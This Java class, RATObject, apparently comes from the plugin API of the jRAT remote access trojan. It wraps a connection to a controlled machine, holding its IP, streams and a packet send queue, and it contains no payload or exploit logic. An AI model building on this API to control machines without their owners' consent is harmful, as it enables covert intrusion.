package pro.jrat.api;

import java.io.DataInputStream;
import java.io.DataOutputStream;

@SuppressWarnings({ "unused", "deprecation" })
public final class RATObject {

	private final String ip;
	private final Connection con;
	private final IWriter writer;
	private final IReader reader;
	private final Queue queue;
	private final DataInputStream in;
	private final DataOutputStream out;
	
	public RATObject(String ip, Connection con, IWriter writer, IReader reader, DataInputStream in, DataOutputStream out, Queue queue) {
		this.ip = ip;
		this.con = con;
		this.writer = writer;
		this.reader = reader;
		this.queue = queue;
		this.in = in;
		this.out = out;
	}
	
	/**
	 * 
	 * @return IP of server in format "IP / PORT"
	 */
	
	public String getIP() {
		return ip;
	}
	
	/**
	 * 
	 * @return The connection class with connection information about this server
	 */
	
	public Connection getConnection() {
		return con;
	}

	
	/**
	 * 
	 * @return Writer
	 */
	
	public IWriter getDataWriter() {
		return writer;
	}
	
	/**
	 * 
	 * @return Reader
	 */
	
	public IReader getDataReader() {
		return reader;
	}
	
	/**
	 * Adds packet to send queue and falls back to controller
	 * @param packet
	 */
	
	public void addToSendQueue(PacketBuilder packet) throws Exception {
		queue.addToSendQueue(packet, this);
	}
	
	
	/**
	 * Only equals if IP is
	 */
	
	@Override
	public boolean equals(Object obj) {
		if (obj instanceof RATObject) {
			return ((RATObject)obj).ip.equals(this.ip);
		}
		
		return false;
	}
	
	/**
	 * Use addToSendQueue directly
	 * @return The packet queue
	 */
	@Deprecated
	public Queue getQueue() {
		return queue;
	}

}
